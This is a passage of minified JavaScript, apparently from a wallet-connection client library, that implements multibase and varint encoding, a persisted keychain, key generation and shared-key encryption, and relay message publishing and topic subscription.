instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},vWe=class{constructor(e,t,i){if(this.name=e,this.prefix=t,t.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=t.codePointAt(0),this.baseDecode=i}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return oie(this,e)}},yWe=class{constructor(e){this.decoders=e}or(e){return oie(this,e)}decode(e){const t=e[0],i=this.decoders[t];if(i)return i.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}};const oie=(r,e)=>new yWe({...r.decoders||{[r.prefix]:r},...e.decoders||{[e.prefix]:e}});let xWe=class{constructor(e,t,i,n){this.name=e,this.prefix=t,this.baseEncode=i,this.baseDecode=n,this.encoder=new bWe(e,t,i),this.decoder=new vWe(e,t,n)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}};const tE=({name:r,prefix:e,encode:t,decode:i})=>new xWe(r,e,t,i),K4=({prefix:r,name:e,alphabet:t})=>{const{encode:i,decode:n}=gWe(t,e);return tE({prefix:r,name:e,encode:i,decode:s=>sie(n(s))})},CWe=(r,e,t,i)=>{const n={};for(let u=0;u<e.length;++u)n[e[u]]=u;let s=r.length;for(;r[s-1]==="=";)--s;const o=new Uint8Array(s*t/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const d=n[r[u]];if(d===void 0)throw new SyntaxError(`Non-${i} character`);c=c<<t|d,a+=t,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=t||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},EWe=(r,e,t)=>{const i=e[e.length-1]==="=",n=(1<<t)-1;let s="",o=0,a=0;for(let c=0;c<r.length;++c)for(a=a<<8|r[c],o+=8;o>t;)o-=t,s+=e[n&a>>o];if(o&&(s+=e[n&a<<t-o]),i)for(;s.length*t&7;)s+="=";return s},wo=({name:r,prefix:e,bitsPerChar:t,alphabet:i})=>tE({prefix:e,name:r,encode(n){return EWe(n,i,t)},decode(n){return CWe(n,i,t,r)}}),_We=tE({prefix:"\0",name:"identity",encode:r=>wWe(r),decode:r=>mWe(r)});var SWe=Object.freeze({__proto__:null,identity:_We});const AWe=wo({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var IWe=Object.freeze({__proto__:null,base2:AWe});const TWe=wo({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var kWe=Object.freeze({__proto__:null,base8:TWe});const NWe=K4({prefix:"9",name:"base10",alphabet:"0123456789"});var PWe=Object.freeze({__proto__:null,base10:NWe});const $We=wo({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),RWe=wo({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var OWe=Object.freeze({__proto__:null,base16:$We,base16upper:RWe});const BWe=wo({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),MWe=wo({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),DWe=wo({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),LWe=wo({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),UWe=wo({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),jWe=wo({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),FWe=wo({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),qWe=wo({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),zWe=wo({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var WWe=Object.freeze({__proto__:null,base32:BWe,base32upper:MWe,base32pad:DWe,base32padupper:LWe,base32hex:UWe,base32hexupper:jWe,base32hexpad:FWe,base32hexpadupper:qWe,base32z:zWe});const HWe=K4({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),VWe=K4({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var KWe=Object.freeze({__proto__:null,base36:HWe,base36upper:VWe});const GWe=K4({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),ZWe=K4({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var YWe=Object.freeze({__proto__:null,base58btc:GWe,base58flickr:ZWe});const JWe=wo({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),QWe=wo({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),XWe=wo({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),eHe=wo({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var tHe=Object.freeze({__proto__:null,base64:JWe,base64pad:QWe,base64url:XWe,base64urlpad:eHe});const aie=Array.from(""),rHe=aie.reduce((r,e,t)=>(r[t]=e,r),[]),iHe=aie.reduce((r,e,t)=>(r[e.codePointAt(0)]=t,r),[]);function nHe(r){return r.reduce((e,t)=>(e+=rHe[t],e),"")}function sHe(r){const e=[];for(const t of r){const i=iHe[t.codePointAt(0)];if(i===void 0)throw new Error(`Non-base256emoji character: ${t}`);e.push(i)}return new Uint8Array(e)}const oHe=tE({prefix:"",name:"base256emoji",encode:nHe,decode:sHe});var aHe=Object.freeze({__proto__:null,base256emoji:oHe}),cHe=cie,BW=128,lHe=-128,uHe=Math.pow(2,31);function cie(r,e,t){e=e||[],t=t||0;for(var i=t;r>=uHe;)e[t++]=r&255|BW,r/=128;for(;r&lHe;)e[t++]=r&255|BW,r>>>=7;return e[t]=r|0,cie.bytes=t-i+1,e}var dHe=LN,hHe=128,MW=127;function LN(r,i){var t=0,i=i||0,n=0,s=i,o,a=r.length;do{if(s>=a)throw LN.bytes=0,new RangeError("Could not decode varint");o=r[s++],t+=n<28?(o&MW)<<n:(o&MW)*Math.pow(2,n),n+=7}while(o>=hHe);return LN.bytes=s-i,t}var fHe=Math.pow(2,7),pHe=Math.pow(2,14),gHe=Math.pow(2,21),mHe=Math.pow(2,28),wHe=Math.pow(2,35),bHe=Math.pow(2,42),vHe=Math.pow(2,49),yHe=Math.pow(2,56),xHe=Math.pow(2,63),CHe=function(r){return r<fHe?1:r<pHe?2:r<gHe?3:r<mHe?4:r<wHe?5:r<bHe?6:r<vHe?7:r<yHe?8:r<xHe?9:10},EHe={encode:cHe,decode:dHe,encodingLength:CHe},lie=EHe;const DW=(r,e,t=0)=>(lie.encode(r,e,t),e),LW=r=>lie.encodingLength(r),UN=(r,e)=>{const t=e.byteLength,i=LW(r),n=i+LW(t),s=new Uint8Array(n+t);return DW(r,s,0),DW(t,s,i),s.set(e,n),new _He(r,t,e,s)};let _He=class{constructor(e,t,i,n){this.code=e,this.size=t,this.digest=i,this.bytes=n}};const uie=({name:r,code:e,encode:t})=>new SHe(r,e,t);let SHe=class{constructor(e,t,i){this.name=e,this.code=t,this.encode=i}digest(e){if(e instanceof Uint8Array){const t=this.encode(e);return t instanceof Uint8Array?UN(this.code,t):t.then(i=>UN(this.code,i))}else throw Error("Unknown type, must be binary type")}};const die=r=>async e=>new Uint8Array(await crypto.subtle.digest(r,e)),AHe=uie({name:"sha2-256",code:18,encode:die("SHA-256")}),IHe=uie({name:"sha2-512",code:19,encode:die("SHA-512")});var THe=Object.freeze({__proto__:null,sha256:AHe,sha512:IHe});const hie=0,kHe="identity",fie=sie,NHe=r=>UN(hie,fie(r)),PHe={code:hie,name:kHe,encode:fie,digest:NHe};var $He=Object.freeze({__proto__:null,identity:PHe});new TextEncoder,new TextDecoder;const UW={...SWe,...IWe,...kWe,...PWe,...OWe,...WWe,...KWe,...YWe,...tHe,...aHe};({...THe,...$He});function pie(r){return globalThis.Buffer!=null?new Uint8Array(r.buffer,r.byteOffset,r.byteLength):r}function RHe(r=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?pie(globalThis.Buffer.allocUnsafe(r)):new Uint8Array(r)}function gie(r,e,t,i){return{name:r,prefix:e,encoder:{name:r,prefix:e,encode:t},decoder:{decode:i}}}const jW=gie("utf8","u",r=>"u"+new TextDecoder("utf8").decode(r),r=>new TextEncoder().encode(r.substring(1))),hI=gie("ascii","a",r=>{let e="a";for(let t=0;t<r.length;t++)e+=String.fromCharCode(r[t]);return e},r=>{r=r.substring(1);const e=RHe(r.length);for(let t=0;t<r.length;t++)e[t]=r.charCodeAt(t);return e}),OHe={utf8:jW,"utf-8":jW,hex:UW.base16,latin1:hI,ascii:hI,binary:hI,...UW};function BHe(r,e="utf8"){const t=OHe[e];if(!t)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?pie(globalThis.Buffer.from(r,"utf-8")):t.decoder.decode(`${t.prefix}${r}`)}var MHe=Object.defineProperty,DHe=(r,e,t)=>e in r?MHe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Hu=(r,e,t)=>DHe(r,typeof e!="symbol"?e+"":e,t);let LHe=class{constructor(e,t){this.core=e,this.logger=t,Hu(this,"keychain",new Map),Hu(this,"name",Lze),Hu(this,"version",Uze),Hu(this,"initialized",!1),Hu(this,"storagePrefix",Hd),Hu(this,"init",async()=>{if(!this.initialized){const i=await this.getKeyChain();typeof i<"u"&&(this.keychain=i),this.initialized=!0}}),Hu(this,"has",i=>(this.isInitialized(),this.keychain.has(i))),Hu(this,"set",async(i,n)=>{this.isInitialized(),this.keychain.set(i,n),await this.persist()}),Hu(this,"get",i=>{this.isInitialized();const n=this.keychain.get(i);if(typeof n>"u"){const{message:s}=ot("NO_MATCHING_KEY",`${this.name}: ${i}`);throw new Error(s)}return n}),Hu(this,"del",async i=>{this.isInitialized(),this.keychain.delete(i),await this.persist()}),this.core=e,this.logger=gr(t,this.name)}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setKeyChain(e){await this.core.storage.setItem(this.storageKey,EN(e))}async getKeyChain(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?_N(e):void 0}async persist(){await this.setKeyChain(this.keychain)}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}};var UHe=Object.defineProperty,jHe=(r,e,t)=>e in r?UHe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Js=(r,e,t)=>jHe(r,typeof e!="symbol"?e+"":e,t);let FHe=class{constructor(e,t,i){this.core=e,this.logger=t,Js(this,"name",Mze),Js(this,"keychain"),Js(this,"randomSessionIdentifier",ON()),Js(this,"initialized",!1),Js(this,"init",async()=>{this.initialized||(await this.keychain.init(),this.initialized=!0)}),Js(this,"hasKeys",n=>(this.isInitialized(),this.keychain.has(n))),Js(this,"getClientId",async()=>{this.isInitialized();const n=await this.getClientSeed(),s=Iw(n);return nC(s.publicKey)}),Js(this,"generateKeyPair",()=>{this.isInitialized();const n=rqe();return this.setPrivateKey(n.publicKey,n.privateKey)}),Js(this,"signJWT",async n=>{this.isInitialized();const s=await this.getClientSeed(),o=Iw(s),a=this.randomSessionIdentifier;return await nR(a,n,Dze,o)}),Js(this,"generateSharedKey",(n,s,o)=>{this.isInitialized();const a=this.getPrivateKey(n),c=iqe(a,s);return this.setSymKey(c,o)}),Js(this,"setSymKey",async(n,s)=>{this.isInitialized();const o=s||y9(n);return await this.keychain.set(o,n),o}),Js(this,"deleteKeyPair",async n=>{this.isInitialized(),await this.keychain.del(n)}),Js(this,"deleteSymKey",async n=>{this.isInitialized(),await this.keychain.del(n)}),Js(this,"encode",async(n,s,o)=>{this.isInitialized();const a=Jre(o),c=mu(s);if(bW(a))return oqe(c,o?.encoding);if(wW(a)){const h=a.senderPublicKey,f=a.receiverPublicKey;n=await this.generateSharedKey(h,f)}const l=this.getSymKey(n),{type:u,senderPublicKey:d}=a;return nqe({type:u,symKey:l,message:c,senderPublicKey:d,encoding:o?.encoding})}),Js(this,"decode",async(n,s,o)=>{this.isInitialized();const a=cqe(s,o);if(bW(a)){const c=aqe(s,o?.encoding);return gu(c)}if(wW(a)){const c=a.receiverPublicKey,l=a.senderPublicKey;n=await this.generateSharedKey(c,l)}try{const c=this.getSymKey(n),l=sqe({symKey:c,encoded:s,encoding:o?.encoding});return gu(l)}catch(c){this.logger.error(`Failed to decode message from topic: '${n}', clientId: '${await this.getClientId()}'`),this.logger.error(c)}}),Js(this,"getPayloadType",(n,s=lu)=>{const o=Ty({encoded:n,encoding:s});return Tg(o.type)}),Js(this,"getPayloadSenderPublicKey",(n,s=lu)=>{const o=Ty({encoded:n,encoding:s});return o.senderPublicKey?$a(o.senderPublicKey,Zo):void 0}),this.core=e,this.logger=gr(t,this.name),this.keychain=i||new LHe(this.core,this.logger)}get context(){return Or(this.logger)}async setPrivateKey(e,t){return await this.keychain.set(e,t),e}getPrivateKey(e){return this.keychain.get(e)}async getClientSeed(){let e="";try{e=this.keychain.get($W)}catch{e=ON(),await this.keychain.set($W,e)}return BHe(e,"base16")}getSymKey(e){return this.keychain.get(e)}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}};var qHe=Object.defineProperty,zHe=Object.defineProperties,WHe=Object.getOwnPropertyDescriptors,FW=Object.getOwnPropertySymbols,HHe=Object.prototype.hasOwnProperty,VHe=Object.prototype.propertyIsEnumerable,jN=(r,e,t)=>e in r?qHe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,KHe=(r,e)=>{for(var t in e||(e={}))HHe.call(e,t)&&jN(r,t,e[t]);if(FW)for(var t of FW(e))VHe.call(e,t)&&jN(r,t,e[t]);return r},GHe=(r,e)=>zHe(r,WHe(e)),Ga=(r,e,t)=>jN(r,typeof e!="symbol"?e+"":e,t);let ZHe=class extends yze{constructor(e,t){super(e,t),this.logger=e,this.core=t,Ga(this,"messages",new Map),Ga(this,"messagesWithoutClientAck",new Map),Ga(this,"name",jze),Ga(this,"version",Fze),Ga(this,"initialized",!1),Ga(this,"storagePrefix",Hd),Ga(this,"init",async()=>{if(!this.initialized){this.logger.trace("Initialized");try{const i=await this.getRelayerMessages();typeof i<"u"&&(this.messages=i);const n=await this.getRelayerMessagesWithoutClientAck();typeof n<"u"&&(this.messagesWithoutClientAck=n),this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",size:this.messages.size})}catch(i){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(i)}finally{this.initialized=!0}}}),Ga(this,"set",async(i,n,s)=>{this.isInitialized();const o=ad(n);let a=this.messages.get(i);if(typeof a>"u"&&(a={}),typeof a[o]<"u")return o;if(a[o]=n,this.messages.set(i,a),s===x9.inbound){const c=this.messagesWithoutClientAck.get(i)||{};this.messagesWithoutClientAck.set(i,GHe(KHe({},c),{[o]:n}))}return await this.persist(),o}),Ga(this,"get",i=>{this.isInitialized();let n=this.messages.get(i);return typeof n>"u"&&(n={}),n}),Ga(this,"getWithoutAck",i=>{this.isInitialized();const n={};for(const s of i){const o=this.messagesWithoutClientAck.get(s)||{};n[s]=Object.values(o)}return n}),Ga(this,"has",(i,n)=>{this.isInitialized();const s=this.get(i),o=ad(n);return typeof s[o]<"u"}),Ga(this,"ack",async(i,n)=>{this.isInitialized();const s=this.messagesWithoutClientAck.get(i);if(typeof s>"u")return;const o=ad(n);delete s[o],Object.keys(s).length===0?this.messagesWithoutClientAck.delete(i):this.messagesWithoutClientAck.set(i,s),await this.persist()}),Ga(this,"del",async i=>{this.isInitialized(),this.messages.delete(i),this.messagesWithoutClientAck.delete(i),await this.persist()}),this.logger=gr(e,this.name),this.core=t}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get storageKeyWithoutClientAck(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name+"_withoutClientAck"}async setRelayerMessages(e){await this.core.storage.setItem(this.storageKey,EN(e))}async setRelayerMessagesWithoutClientAck(e){await this.core.storage.setItem(this.storageKeyWithoutClientAck,EN(e))}async getRelayerMessages(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?_N(e):void 0}async getRelayerMessagesWithoutClientAck(){const e=await this.core.storage.getItem(this.storageKeyWithoutClientAck);return typeof e<"u"?_N(e):void 0}async persist(){await this.setRelayerMessages(this.messages),await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}};var YHe=Object.defineProperty,JHe=Object.defineProperties,QHe=Object.getOwnPropertyDescriptors,qW=Object.getOwnPropertySymbols,XHe=Object.prototype.hasOwnProperty,eVe=Object.prototype.propertyIsEnumerable,FN=(r,e,t)=>e in r?YHe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,w8=(r,e)=>{for(var t in e||(e={}))XHe.call(e,t)&&FN(r,t,e[t]);if(qW)for(var t of qW(e))eVe.call(e,t)&&FN(r,t,e[t]);return r},fI=(r,e)=>JHe(r,QHe(e)),Hl=(r,e,t)=>FN(r,typeof e!="symbol"?e+"":e,t);let tVe=class extends xze{constructor(e,t){super(e,t),this.relayer=e,this.logger=t,Hl(this,"events",new en.EventEmitter),Hl(this,"name",qze),Hl(this,"queue",new Map),Hl(this,"publishTimeout",fe.toMiliseconds(fe.ONE_MINUTE)),Hl(this,"initialPublishTimeout",fe.toMiliseconds(fe.ONE_SECOND*15)),Hl(this,"needsTransportRestart",!1),Hl(this,"publish",async(i,n,s)=>{var o;this.logger.debug("Publishing Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:i,message:n,opts:s}});const a=s?.ttl||RW,c=X7(s),l=s?.prompt||!1,u=s?.tag||0,d=s?.id||Cs().toString(),h={topic:i,message:n,opts:{ttl:a,relay:c,prompt:l,tag:u,id:d,attestation:s?.attestation,tvf:s?.tvf}},f=`Failed to publish payload, please try again. id:${d} tag:${u}`;try{const p=new Promise(async g=>{const w=({id:x})=>{h.opts.id===x&&(this.removeRequestFromQueue(x),this.relayer.events.removeListener(Fs.publish,w),g(h))};this.relayer.events.on(Fs.publish,w);const m=Mf(new Promise((x,S)=>{this.rpcPublish({topic:i,message:n,ttl:a,prompt:l,tag:u,id:d,attestation:s?.attestation,tvf:s?.tvf}).then(x).catch(T=>{this.logger.warn(T,T?.message),S(T)})}),this.initialPublishTimeout,`Failed initial publish, retrying.... id:${d} tag:${u}`);try{await m,this.events.removeListener(Fs.publish,w)}catch(x){this.queue.set(d,fI(w8({},h),{attempt:1})),this.logger.warn(x,x?.message)}});this.logger.trace({type:"method",method:"publish",params:{id:d,topic:i,message:n,opts:s}}),await Mf(p,this.publishTimeout,f)}catch(p){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(p),(o=s?.internal)!=null&&o.throwOnFailedPublish)throw p}finally{this.queue.delete(d)}}),Hl(this,"on",(i,n)=>{this.events.on(i,n)}),Hl(this,"once",(i,n)=>{this.events.once(i,n)}),Hl(this,"off",(i,n)=>{this.events.off(i,n)}),Hl(this,"removeListener",(i,n)=>{this.events.removeListener(i,n)}),this.relayer=e,this.logger=gr(t,this.name),this.registerEventListeners()}get context(){return Or(this.logger)}async rpcPublish(e){var t,i,n,s;const{topic:o,message:a,ttl:c=RW,prompt:l,tag:u,id:d,attestation:h,tvf:f}=e,p={method:c5(X7().protocol).publish,params:w8({topic:o,message:a,ttl:c,prompt:l,tag:u,attestation:h},f),id:d};co((t=p.params)==null?void 0:t.prompt)&&((i=p.params)==null||delete i.prompt),co((n=p.params)==null?void 0:n.tag)&&((s=p.params)==null||delete s.tag),this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"message",direction:"outgoing",request:p});const g=await this.relayer.request(p);return this.relayer.events.emit(Fs.publish,e),this.logger.debug("Successfully Published Payload"),g}removeRequestFromQueue(e){this.queue.delete(e)}checkQueue(){this.queue.forEach(async(e,t)=>{const i=e.attempt+1;this.queue.set(t,fI(w8({},e),{attempt:i}));const{topic:n,message:s,opts:o,attestation:a}=e;this.logger.warn({},`Publisher: queue->publishing: ${e.opts.id}, tag: ${e.opts.tag}, attempt: ${i}`),await this.rpcPublish(fI(w8({},e),{topic:n,message:s,ttl:o.ttl,prompt:o.prompt,tag:o.tag,id:o.id,attestation:a,tvf:o.tvf})),this.logger.warn({},`Publisher: queue->published: ${e.opts.id}`)})}registerEventListeners(){this.relayer.core.heartbeat.on(Ks.pulse,()=>{if(this.needsTransportRestart){this.needsTransportRestart=!1,this.relayer.events.emit(Fs.connection_stalled);return}this.checkQueue()}),this.relayer.on(Fs.message_ack,e=>{this.removeRequestFromQueue(e.id.toString())})}};var rVe=Object.defineProperty,iVe=(r,e,t)=>e in r?rVe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,K2=(r,e,t)=>iVe(r,typeof e!="symbol"?e+"":e,t);let nVe=class{constructor(){K2(this,"map",new Map),K2(this,"set",(e,t)=>{const i=this.get(e);this.exists(e,t)||this.map.set(e,[...i,t])}),K2(this,"get",e=>this.map.get(e)||[]),K2(this,"exists",(e,t)=>this.get(e).includes(t)),K2(this,"delete",(e,t)=>{if(typeof t>"u"){this.map.delete(e);return}if(!this.map.has(e))return;const i=this.get(e);if(!this.exists(e,t))return;const n=i.filter(s=>s!==t);if(!n.length){this.map.delete(e);return}this.map.set(e,n)}),K2(this,"clear",()=>{this.map.clear()})}get topics(){return Array.from(this.map.keys())}};var sVe=Object.defineProperty,oVe=Object.defineProperties,aVe=Object.getOwnPropertyDescriptors,zW=Object.getOwnPropertySymbols,cVe=Object.prototype.hasOwnProperty,lVe=Object.prototype.propertyIsEnumerable,qN=(r,e,t)=>e in r?sVe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Mb=(r,e)=>{for(var t in e||(e={}))cVe.call(e,t)&&qN(r,t,e[t]);if(zW)for(var t of zW(e))lVe.call(e,t)&&qN(r,t,e[t]);return r},pI=(r,e)=>oVe(r,aVe(e)),Yi=(r,e,t)=>qN(r,typeof e!="symbol"?e+"":e,t);let uVe=class extends _ze{constructor(e,t){super(e,t),this.relayer=e,this.logger=t,Yi(this,"subscriptions",new Map),Yi(this,"topicMap",new nVe),Yi(this,"events",new en.EventEmitter),Yi(this,"name",Zze),Yi(this,"version",Yze),Yi(this,"pending",new Map),Yi(this,"cached",[]),Yi(this,"initialized",!1),Yi(this,"storagePrefix",Hd),Yi(this,"subscribeTimeout",fe.toMiliseconds(fe.ONE_MINUTE)),Yi(this,"initialSubscribeTimeout",fe.toMiliseconds(fe.ONE_SECOND*15)),Yi(this,"clientId"),Yi(this,"batchSubscribeTopicsLimit",500),Yi(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),this.registerEventListeners(),await this.restore()),this.initialized=!0}),Yi(this,"subscribe",async(i,n)=>{this.isInitialized(),this.logger.debug("Subscribing Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:i,opts:n}});try{const s=X7(n),o={topic:i,relay:s,transportType:n?.transportType};this.pending.set(i,o);const a=await this.rpcSubscribe(i,s,n);return typeof a=="string"&&(this.onSubscribe(a,o),this.logger.debug("Successfully Subscribed Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:i,opts:n}})),a}catch(s){throw this.logger.debug("Failed to Subscribe Topic"),this.logger.error(s),s}}),Yi(this,"unsubscribe",async(i,n)=>{this.isInitialized(),typeof n?.id<"u"?await this.unsubscribeById(i,n.id,n):await this.unsubscribeByTopic(i,n)}),Yi(this,"isSubscribed",i=>new Promise(n=>{n(this.topicMap.topics.includes(i))})),Yi(this,"isKnownTopic",i=>new Promise(n=>{n(this.topicMap.topics.includes(i)||this.pending.has(i)||this.cached.some(s=>s.topic===i))})),Yi(this,"on",(i,n)=>{this.events.on(i,n)}),Yi(this,"once",(i,n)=>{this.events.once(i,n)}),Yi(this,"off",(i,n)=>{this.events.off(i,n)}),Yi(this,"removeListener",(i,n)=>{this.events.removeListener(i,n)}),Yi(this,"start",async()=>{await this.onConnect()}),Yi(this,"stop",async()=>{await this.onDisconnect()}),Yi(this,"restart",async()=>{await this.restore(),await this.onRestart()}),Yi(this,"checkPending",async()=>{if(this.pending.size===0&&(!this.initialized||!this.relayer.connected))return;const i=[];this.pending.forEach(n=>{i.push(n)}),await this.batchSubscribe(i)}),Yi(this,"registerEventListeners",()=>{this.relayer.core.heartbeat.on(Ks.pulse,async()=>{await this.checkPending()}),this.events.on(Xa.created,async i=>{const n=Xa.created;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:i}),await this.persist()}),this.events.on(Xa.deleted,async i=>{const n=Xa.deleted;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:i}),await this.persist()})}),this.relayer=e,this.logger=gr(t,this.name),this.clientId=""}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.relayer.core.customStoragePrefix+"//"+this.name}get length(){return this.subscriptions.size}get ids(){return Array.from(this.subscriptions.keys())}get values(){return Array.from(this.subscriptions.values())}get topics(){return this.topicMap.topics}get hasAnyTopics(){return this.topicMap.topics.length>0||this.pending.size>0||this.cached.length>0||this.subscriptions.size>0}hasSubscription(e,t){let i=!1;try{i=this.getSubscription(e).topic===t}catch{}return i}reset(){this.cached=[],this.initialized=!0}onDisable(){this.values.length>0&&(this.cached=this.values),this.subscriptions.clear(),this.topicMap.clear()}async unsubscribeByTopic(e,t){const i=this.topicMap.get(e);await Promise.all(i.map(async n=>await this.unsubscribeById(e,n,t)))}async unsubscribeById(e,t,i){this.logger.debug("Unsubscribing Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:t,opts:i}});try{const n=X7(i);await this.restartToComplete({topic:e,id:t,relay:n}),await this.rpcUnsubscribe(e,t,n);const s=gn("USER_DISCONNECTED",`${this.name}, ${e}`);await this.onUnsubscribe(e,t,s),this.logger.debug("Successfully Unsubscribed Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:t,opts:i}})}catch(n){throw this.logger.debug("Failed to Unsubscribe Topic"),this.logger.error(n),n}}async rpcSubscribe(e,t,i){var n;(!i||i?.transportType===fn.relay)&&await this.restartToComplete({topic:e,id:e,relay:t});const s={method:c5(t.protocol).subscribe,params:{topic:e}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:s});const o=(n=i?.internal)==null?void 0:n.throwOnFailedPublish;try{const a=await this.getSubscriptionId(e);if(i?.transportType===fn.link_mode)return setTimeout(()=>{(this.relayer.connected||this.relayer.connecting)&&this.relayer.request(s).catch(u=>this.logger.warn(u))},fe.toMiliseconds(fe.ONE_SECOND)),a;const c=new Promise(async u=>{const d=h=>{h.topic===e&&(this.events.removeListener(Xa.created,d),u(h.id))};this.events.on(Xa.created,d);try{const h=await Mf(new Promise((f,p)=>{this.relayer.request(s).catch(g=>{this.logger.warn(g,g?.message),p(g)}).then(f)}),this.initialSubscribeTimeout,`Subscribing to ${e} failed, please try again`);this.events.removeListener(Xa.created,d),u(h)}catch{}}),l=await Mf(c,this.subscribeTimeout,`Subscribing to ${e} failed, please try again`);if(!l&&o)throw new Error(`Subscribing to ${e} failed, please try again`);return l?a:null}catch(a){if(this.logger.debug("Outgoing Relay Subscribe Payload stalled"),this.relayer.events.emit(Fs.connection_stalled),o)throw a}return null}async rpcBatchSubscribe(e){if(!e.length)return;const t=e[0].relay,i={method:c5(t.protocol).batchSubscribe,params:{topics:e.map(n=>n.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i});try{await await Mf(new Promise(n=>{this.relayer.request(i).catch(s=>this.logger.warn(s)).then(n)}),this.subscribeTimeout,"rpcBatchSubscribe failed, please try again")}catch{this.relayer.events.emit(Fs.connection_stalled)}}async rpcBatchFetchMessages(e){if(!e.length)return;const t=e[0].relay,i={method:c5(t.protocol).batchFetchMessages,params:{topics:e.map(s=>s.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i});let n;try{n=await await Mf(new Promise((s,o)=>{this.relayer.request(i).catch(a=>{this.logger.warn(a),o(a)}).then(s)}),this.subscribeTimeout,"rpcBatchFetchMessages failed, please try again")}catch{this.relayer.events.emit(Fs.connection_stalled)}return n}rpcUnsubscribe(e,t,i){const n={method:c5(i.protocol).unsubscribe,params:{topic:e,id:t}};return 